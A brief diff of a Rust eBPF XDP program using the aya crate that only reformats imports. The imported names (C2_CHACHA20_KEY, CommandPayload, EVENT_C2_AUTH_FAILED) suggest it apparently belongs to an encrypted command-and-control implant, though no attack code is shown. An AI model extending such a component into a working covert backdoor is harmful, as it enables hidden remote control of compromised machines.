@@ -1,8 +1,5 @@
 use aya_ebpf::{
-    bindings::xdp_action,
-    helpers::bpf_ktime_get_ns,
-    macros::xdp,
-    programs::XdpContext,
+    bindings::xdp_action, helpers::bpf_ktime_get_ns, macros::xdp, programs::XdpContext,
 };
 use common::{
     CommandPayload, EventHeader, C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_C2_AUTH_FAILED,
